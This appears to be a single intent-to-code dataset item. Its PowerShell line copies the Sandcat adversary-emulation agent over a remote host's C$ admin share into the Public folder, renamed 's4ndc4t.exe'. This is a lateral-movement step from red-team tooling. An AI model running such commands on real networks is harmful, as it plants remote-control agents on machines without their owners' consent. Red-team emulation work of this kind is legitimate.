# Natural language intent:
# Copy Sandcat executable to a specified drive on a remote host.

$path = "sandcat.go-windows"; ; $drive = "\\${Rem.Host.Fqdn}\C$"; ; Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
